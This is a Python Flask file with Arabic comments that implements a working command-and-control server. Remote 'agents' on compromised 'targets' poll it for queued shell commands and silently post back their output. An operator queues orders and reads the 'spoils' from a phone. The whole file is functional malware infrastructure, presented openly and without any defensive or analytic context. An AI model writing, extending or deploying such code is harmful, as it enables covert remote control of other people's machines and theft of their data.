from flask import Flask, request, jsonify

app = Flask(__name__)

# جدول لتخزين الأوامر والنتائج الخاصة بالأهداف
command_queue = {}
last_results = {}

@app.route('/api/v1/sync', methods=['GET', 'POST'])
def sync_with_agent():
    agent_id = request.headers.get("X-Agent-ID", "UNKNOWN_TARGET")
    
    if request.method == 'POST':
        # استقبال نتائج تنفيذ الأوامر من الهدف بصمت
        result_data = request.json.get("result", "")
        last_results[agent_id] = result_data
        return jsonify({"status": "received"}), 200
        
    else:
        # إرسال الأمر المعلق للهدف عند وصول نبضته
        cmd = command_queue.get(agent_id, "echo 'No orders yet'")
        if agent_id in command_queue:
            del command_queue[agent_id] # مسح الأمر بعد سحبه
        return cmd, 200

@app.route('/command', methods=['POST'])
def send_command():
    # بوابتك من هاتفك لإعطاء الأوامر
    data = request.json
    agent_id = data.get("agent_id")
    cmd = data.get("cmd")
    command_queue[agent_id] = cmd
    return jsonify({"status": "Command queued successfully"}), 200

@app.route('/results/<agent_id>', methods=['GET'])
def get_results(agent_id):
    # استعراض غنائم ونتائج الهدف على هاتفك
    return jsonify({"last_output": last_results.get(agent_id, "No data yet")})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

